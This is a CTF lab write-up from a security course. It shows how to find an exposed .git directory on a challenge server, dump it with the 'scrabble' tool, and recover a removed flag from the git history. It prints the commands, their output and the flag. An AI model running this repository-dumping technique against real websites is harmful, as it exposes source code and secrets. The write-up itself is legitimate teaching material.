---
title: Simple Web 0x01(Lab - gitleak)
tags: [CTF, Web, NTUSTWS]

category: "Security Course｜NTUST WS｜Information Leak"
date: 2023-01-31
---

# Simple Web 0x01(Lab - gitleak)
<!-- more -->
###### tags: `NTUSTWS` `CTF` `Web`
Challenge: http://h4ck3r.quest:9000/

## Exploit - gitleak + basic Git command
1. Use the extension of Firefox(or Google), `Dotgit`, to check if the website actually has `git leak problem`
![](https://i.imgur.com/ZtMbj9z.png)

2.  denny0223/scrabble
To use scrabble tool to leak information
    ```bash
    $ git clone https://github.com/denny0223/scrabble.git
    $ cd scrabble
    $ sudo ./scrabble http://h4ck3r.quest:9000/
    ```
3. Still no flag

    There's `flag.php` but still no flag in there. `HEAD` said `HEAD is now at a0228bd Remove flag.` Thus, we can look up the history by the command below.

    ```bash
    $ git log --stat a0228bd
    commit a0228bd6ff968f3eca017125a5434b517ad2a83a (HEAD -> master)
    Author: splitline <tbsthitw@gmail.com>
    Date:   Wed Mar 9 16:23:46 2022 +0800

        Remove flag.

     flag.php | 2 +-
     1 file changed, 1 insertion(+), 1 deletion(-)

    commit 6cfe38db75ec90126f53088ea87c286c83c1bfb3
    Author: splitline <tbsthitw@gmail.com>
    Date:   Wed Mar 9 16:23:15 2022 +0800

        Init

     flag.php  | 5 +++++
     index.php | 1 +
     2 files changed, 6 insertions(+)
    ```
4. Check the difference of commit version

    ```bash
    $ git diff HEAD <commit-id>
    diff --git a/flag.php b/flag.php
    index d1f8785..5b6cf79 100644
    --- a/flag.php
    +++ b/flag.php
    @@ -1,5 +1,5 @@
     <?php
    -// No flag for you!
    - [ ]     +$FLAG = "FLAG{gitleak_is_fun}";
     ?>

     Flag is in the source code.
    \ No newline at end of file
    ```